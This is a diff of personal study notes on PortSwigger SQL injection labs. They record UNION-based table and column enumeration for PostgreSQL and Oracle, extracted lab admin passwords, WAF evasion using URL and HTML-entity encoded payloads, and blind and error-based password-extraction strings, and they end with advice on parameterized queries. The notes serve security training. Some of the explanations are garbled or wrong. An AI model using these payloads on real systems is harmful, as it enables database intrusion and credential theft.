@@ -271,29 +271,337 @@ solution;
 then we found name of the table at the  end of  it
 '+Union select column_name,null from information_schema.columns where table_name='users_qthbul'
 then ;
-'+Union select username_burnmr,password_kocrqi from  users_qthbul --
-user_defined_types
-pg_statio_user_sequences
-pg_user_mappings
-pg_stat_xact_user_functions
-user_mappings
-pg_stat_user_tables
-user_mapping_options
-pg_stat_xact_user_tables
-pg_statio_user_tables
+'union select table_name,Null from information_schema.tables-- 
+column_column_usage
 pg_user
-users_qthbul
- now 
- we want the columns(username,password) from users_qthbul
- columns we got;
- password_kocrqi
- username_burnmr
- email
- Portable Hat
+tables
+users_qsfhjx
+
+
+'union select column_name,Null from information_schema.columns where table_name='users_qsfhjx'--
+email
+username_hnefnz
+password_adbkwh
+Union select username_hnefnz,password_adbkwh from users_qsfhjx--
+for administrator;
+password;zba54q160vgvq7n7ypja
+
+# Listing the contents of an Oracle database lab;
+rules; you can listen tables; SELECT * FROM all_tables
+for columns;
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+lab; This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user. 
+ Hint
+
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 
+
+analysis;
+  - sql injection in the product category filter.
+  - extract the name of the table+columns in it-> to extract username,password
+  - log in as administrator.
+  - 
+solution;
+First define the number of columns inside dual table(built in table inside oracle)
+note that we use : Dual as a test for our database by generating dummry data in single row or column
+
+'Union select 'abc','cde' from dual--
+from here we knew that we have 2 columns.
+know let's start to extract table names
+'union select table_name,Null from all_tables--
+ 	USERS_CXPIBK
+ 	DUAL
+ 	
+ SELECT column_name,Null FROM all_tab_columns WHERE table_name = 'USERS_CXPIBK'
+ 	columns are,
+ 		USERNAME_ETLUHI
+		PASSWORD_NKBJFC
+		EMAIL
+		
+'union select USERNAME_ETLUHI,PASSWORD_NKBJFC from USERS_CXPIBK--
+answer;
+
+administrator		
+yck9ysawofdkdwcibvtu
+-------------
+How to obfuscate(evade) ther filter to inject sql injection???
+
+  - server,client systems are using methods for decoding incoming traffic they get from each other
+  - if you want to inject -> define where you will inject first
+  - also you may notice ; your query is decoded at the server side
+  - while Html element that the client write decoded on the client side.
+  - obfuscation via URl encoding;
+    - any url is encoded through the browser before it's sent to the  server
+      - ex; Fish & chips ->browser leaves Fish,chips as it is the only words that will be decoded are (space,&) why that as in other querys on the browser there are spaces.& -> so this may make interuption for the server when decode so browser encode it with &(ampersand)
+      - space=%20
+      - so you can inject URL encoded data => it will be interpreted by the server
+      - you can inject into url by encode the words of payload you pass into familiar words that browser knows like %
+
+
+-
+How to obfuscute URL double in order to inject your payload?  
+  -some servers have two roundes of decoding to avoid any injection thorugh it
+  - know if you encode the payload two this will smuggle the server so  injection will be done
+ - % will be encoded again into another payload like; %25 this will pass through waf(web app firewall)
+- 
+
+
+--
+Obfuscation via Html encoding??
+  - now we want to pass the injection payload throught the server using an HTML script-> just incode the word
+  - also you can  avoid the blocking by the server by adding some zeros before the script you encoded.
+  - <stockCheck>
+    <productId>
+        123
+    </productId>
+    <storeId>
+        999 &#x53;ELECT * FROM information_schema.tables
+    </storeId>
+</stockCheck>
+as you see here we incode s from select just 
+
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+
+lab;
+ This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
+ A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this. 
+ analysis;
+ 	- sql injection in stock check feature
+ 	- result of query returned in application response
+ 	- use UNION attack to retrive data
+ 	- db contain users table
+ 	- users table -> contain usernames,passwords
+ 	- retrieve admin users credentials
+ 	- use Hackvertor to obfusecute the filter .
+ 	
+ solution;	
+ 	UNION SELECT username FROM users
+ I converted that query into decoded hex using cyberchef; &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
+ then passed it into the html code in stock check 
+ 	
+administrator
+carlos
+wiener
+35 units
+
+then I passed this to see the password;
+ 	UNION SELECT password FROM users
+converted to html hex entities
+&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
+then this was the answer
+sgm3efa7myeo1fiolmbc
+l1jhqclppsp5tpzcsnu5
+8gow8j7wyyv1gzsw83p1
+35 units
+
+from here we want administrator + it's pass is the first one let's pass in 
+ 	 
+not solved yet as ther's a problem in the portswigger.
+
+
+----
+lab;
+ Not solved
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
+
+The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data
+
+analysis;
+	- sql  injection in product category filter.
+	- result returned in application response.
+	- use UNION to retrieve data from other tables.
+		- determine num of columns by the query
+
+
+
+
+solution;
+'UNION SELECT Null,'kzfzIC',Null--
+
+---
+
+ what is blind sql injection?
+  - occur when the application is vulnerable + HTTP response doesn't contain on the results of relevent sql query   
+  - union attack aren't efficient as it's relay on being able to see the injected query within the application process.
  
- this is the username;wiener
- this is the password;zu7mwvsfotbnin10qlpm
-stoped here;Listing the contents of an Oracle database lab;
+ 
+ how to use blind sql injection?
+ 	- if app uses traking id for each user 
+ 		like this Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+ 	- in this case -> apps uses sql query to determine the user.
+ 		SELECT TrackingId FROM TrackedUsers WHERE TrackingId =      'u5YD3PapBcR4lN3e7Tj4' 
+ 
+ from these two lines -> blind sql injection can be passed into this query
+ 
+ to test that query use these two conditions;
+ …xyz' AND '1'='1 => return false
+…xyz' AND '1'='2 => return true
+---
+now using this id of the user you can exploit the password of that user ;
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+
+lab; note I solved this lab before but the output of it didn't came true so I will solve it again to make sure where is the error ;
+ This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+analysis;
+	- blind sql injection 
+	- application uses traking cookie
+	- result of sql query aren't returned yet
+	- database contain table->users
+		username,password
+	- exploit sql injection to find pass of user
+	
+pause for password for now;
+
+
+
+
+
+
+
+
+
+Error-based SQL injection
+	- you use error messages to extract sesitive data from db in blind context
+	-you extract data using conditionals errors.
+	
+ex;
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+
+as you see -> first condition -> implies a as 1!=2
+-> second condition -> implies 1/0 as 1=1 
+
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+the same concept; now if the name != admi.. -> implies a else 1/0 error condition.
+
+
+lab;
+
+  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+analysis;
+	-blind sql injection
+	-app uses traking cookies
+	- app doesn't respond even if the query returns any rows
+	- if the query causes an error -> app will return a custom error message.
+	-db contain table-> users->username,password
+	-exploit blind sql injection ->find password=>administrator.
+
+ solution;
+ pause for now.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+Note
+
+To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+analysis;
+	- blind sql injection vulnerability
+	-traking cookie
+	- out-of-band with external domain
+	- table=> users->columns username,password
+	- use the blind sql to exploit the pass of administrator.
+	- to solve ->pass with administrator user
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+how to prevent Sql injection?
+ you need to change query from using variable as input into
+ using hardcoded constant that takes variable from another function to prevent access this variable through the query that control the database.
+ ex;
+ String query = "SELECT * FROM products WHERE category = '"+ input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+as you see; input is passed into the clause of query -> this is dangerous we can pass into it Null from outside and pass all database.
+to avoid this problem use pramatarized queries ;
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();  
+
+
+
+
+
+
 
 
 
